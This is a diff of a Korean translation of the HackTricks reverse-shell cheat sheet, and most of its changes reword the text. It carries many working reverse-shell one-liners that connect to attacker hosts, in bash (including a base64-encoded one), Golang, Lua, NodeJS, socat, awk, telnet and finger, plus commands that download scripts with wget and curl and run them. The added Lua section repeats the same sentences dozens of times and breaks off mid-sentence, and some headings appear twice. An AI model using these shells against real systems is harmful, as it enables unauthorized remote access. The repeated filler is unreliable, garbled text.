@@ -6,15 +6,15 @@
 
 HackTricks를 지원하는 다른 방법:
 
-* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하길 원한다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* **회사가 HackTricks에 광고되길 원하거나** **PDF로 HackTricks를 다운로드하길 원한다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
 * **해킹 트릭을 공유하려면 PR을** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 제출하세요.**
 
 </details>
 
-**이 쉘 중 하나에 대한 질문이 있다면** [**https://explainshell.com/**](https://explainshell.com) **에서 확인할 수 있습니다.**
+**이러한 쉘 중 어떤 것에 대한 질문이 있다면** [**https://explainshell.com/**](https://explainshell.com) **에서 확인할 수 있습니다.**
 
 ## 전체 TTY
 
@@ -35,7 +35,7 @@ exec >&0
 ```
 ### 심볼 안전 쉘
 
-다른 쉘도 확인하는 것을 잊지 마세요: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, 그리고 bash.
+다른 쉘들(sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, 그리고 bash)도 확인하는 것을 잊지 마세요.
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -49,7 +49,7 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 1. **`bash -i`**: 이 명령어 부분은 대화형(`-i`) Bash 쉘을 시작합니다.
 2. **`>&`**: 이 명령어 부분은 **표준 출력(`stdout`)과 표준 에러(`stderr`)를 동일한 대상으로 리다이렉팅**하는 약식 표기법입니다.
 3. **`/dev/tcp/<공격자-IP>/<포트>`**: 이는 지정된 IP 주소와 포트로의 TCP 연결을 나타내는 특수 파일입니다.
-* **출력 및 에러 스트림을 이 파일로 리다이렉팅**함으로써, 해당 명령어는 대화형 쉘 세션의 출력을 공격자의 기기로 보냅니다.
+* **출력 및 에러 스트림을 이 파일로 리다이렉팅**함으로써, 해당 명령어는 대화형 쉘 세션의 출력을 공격자의 기기로 전송합니다.
 4. **`0>&1`**: 이 명령어 부분은 **표준 입력(`stdin`)을 표준 출력(`stdout`)과 동일한 대상으로 리다이렉팅**합니다.
 
 ### 파일 생성 및 실행
@@ -59,7 +59,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## 전방 쉘
 
-만약 Linux 기반 웹 애플리케이션에서 **RCE 취약점**을 만나게 된다면, Iptables 규칙이나 다른 필터의 존재로 인해 **역쉘 획득이 어려워질 수 있는** 경우가 있습니다. 이러한 시나리오에서는 파이프를 사용하여 침투된 시스템 내에서 PTY 쉘을 생성하는 것을 고려해보세요.
+만약 Linux 기반 웹 애플리케이션에서 **RCE 취약점**을 만나게 되면, Iptables 규칙이나 다른 필터의 존재로 인해 **역쉘 획득이 어려워질 수 있는** 경우가 있습니다. 이러한 시나리오에서는 파이프를 사용하여 침해된 시스템 내에서 PTY 쉘을 생성하는 것을 고려해보세요.
 
 코드는 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)에서 찾을 수 있습니다.
 
@@ -69,7 +69,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 * 페이로드의 접두사 및 접미사 (있는 경우)
 * 페이로드가 전송되는 방식 (헤더? 데이터? 추가 정보?)
 
-그런 다음, **명령을 전송**하거나 심지어 **`upgrade` 명령을 사용**하여 완전한 PTY를 얻을 수 있습니다 (파이프는 약 1.3초의 지연으로 읽고 쓰입니다).
+그런 다음, **명령을 보내거나** 심지어 **`upgrade` 명령을 사용하여** 완전한 PTY를 얻을 수 있습니다 (파이프는 약 1.3초의 지연으로 읽고 쓰입니다).
 
 ## Netcat
 ```bash
@@ -87,7 +87,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet은 네트워크를 통해 다른 컴퓨터에 로그인하거나 명령을 실행하기 위한 프로토콜입니다. Telnet을 사용하면 원격 시스템에 접속하여 명령을 실행하거나 파일을 전송할 수 있습니다. Telnet은 보안에 취약하므로 SSH와 같은 보안 프로토콜을 사용하는 것이 좋습니다.
+Telnet은 네트워크를 통해 다른 컴퓨터에 로그인하고 명령을 실행하는 데 사용되는 프로토콜입니다. Telnet을 사용하면 원격 시스템에 액세스하여 파일을 전송하거나 관리 작업을 수행할 수 있습니다. Telnet은 보안상의 이유로 SSH로 대체되는 것이 권장됩니다.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -100,11 +100,9 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-```
-명령을 보내려면 쓰고, 엔터를 누르고 CTRL+D를 누릅니다 (STDIN을 중지하려면)
-
 **피해자**
-```
+
+명령을 보내려면 적어두고 Enter를 누르고 CTRL+D를 누르세요 (STDIN을 중지하려면)
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
@@ -151,19 +149,15 @@ p.waitFor()
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-가장 중요한 취약점을 찾아 더 빨리 해결할 수 있습니다. Intruder는 공격 표면을 추적하고 적극적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**지금 무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Golang
+
+## 고랭 (Golang)
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
+
+Lua는 브라질에서 개발된 경량 스크립팅 언어입니다. C로 작성된 Lua는 임베디드 시스템 및 게임 개발에 널리 사용됩니다. Lua는 간결하고 빠르며 확장 가능한 특징을 가지고 있습니다. Lua는 스크립트 언어로 사용되며 C 코드에 쉽게 통합될 수 있습니다. Lua는 다양한 플랫폼에서 실행될 수 있으며 다양한 운영 체제에서 지원됩니다. Lua는 사용자 정의 데이터 타입 및 메타테이블을 지원하여 동적인 프로그래밍을 할 수 있습니다. Lua는 강력한 문자열 처리 기능을 제공하며 테이블을 사용하여 데이터를 구조화할 수 있습니다. Lua는 또한 함수형 프로그래밍을 지원하며 익명 함수 및 클로저를 사용할 수 있습니다. Lua는 다른 언어와의 통합을 쉽게 할 수 있도록 C API를 제공합니다. Lua는 빠르고 가볍기 때문에 다양한 응용 프로그램에서 스크립팅 언어로 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며 다른 언어와의 통합을 쉽게 할 수 있습니다. Lua는 다양한 분야에서 사용되며 커뮤니티에 의해 지속적으로 발전하고 있습니다. Lua는 간결하고 확장 가능한 스크립팅 언어로 다양한 응용 분야에서 사용됩니다. Lua는 사용자 정의 가능한 구문 분석기를 통해 다양한 도메인에 적합한 언어로 확장될 수 있습니다. Lua는 다른 언어와의 상호 운용성을 강조하며
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -172,7 +166,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## NodeJS
 
-노드JS(NodeJS)는 자바스크립트 런타임 환경으로, 서버 측 애플리케이션을 개발하는 데 널리 사용됩니다. NodeJS는 비동기 이벤트 기반 아키텍처를 사용하여 빠르고 확장 가능한 네트워크 응용 프로그램을 구축하는 데 적합합니다. NodeJS는 V8 JavaScript 엔진에 기반하고 있으며, NPM(Node Package Manager)을 통해 다양한 모듈을 사용할 수 있습니다. NodeJS는 웹 서버, API 서버, 마이크로서비스 및 기타 서버 측 응용 프로그램을 개발하는 데 매우 인기가 있습니다.
+## 노드JS
 ```javascript
 (function(){
 var net = require("net"),
@@ -249,22 +243,22 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
-## 손가락
+## Finger
 
 **공격자**
 ```bash
 while true; do nc -l 79; done
 ```
-```
-명령을 보내려면 쓰고, Enter를 누르고 CTRL+D를 누릅니다 (STDIN을 중지하려면)
-
 **피해자**
-```
+
+명령을 보내려면 적어두고 Enter를 누르고 CTRL+D를 누르세요 (STDIN을 중지하려면)
 ```bash
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done
 
 export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
 ```
+## Gawk
+
 ## Gawk
 ```bash
 #!/usr/bin/gawk -f
@@ -290,11 +284,11 @@ close(Service)
 ```
 ## Xterm
 
-이것은 포트 6001에서 시스템에 연결을 시도할 것입니다:
+이 명령은 포트 6001에서 시스템에 연결을 시도합니다:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-역쉘을 잡기 위해 다음을 사용할 수 있습니다 (포트 6001에서 수신 대기):
+역쉘을 잡기 위해 (포트 6001에서 수신 대기할 것입니다):
 ```bash
 # Authorize host
 xhost +targetip
@@ -303,7 +297,7 @@ Xnest :1
 ```
 ## Groovy
 
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 참고: Java 역쉘도 Groovy에서 작동합니다
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) 참고: Java 역쉘도 Groovy에서 작동합니다.
 ```bash
 String host="localhost";
 int port=8044;
@@ -323,10 +317,10 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 HackTricks를 지원하는 다른 방법:
 
-* **회사를 HackTricks에서 광고하거나 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
+* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
 * [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [디스코드 그룹](https://discord.gg/hRep4RUj7f)** 또는 [텔레그램 그룹](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
-* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 요령을 공유**하세요.
+* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)이나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하여 **해킹 요령을 공유하세요.**
 
 </details>
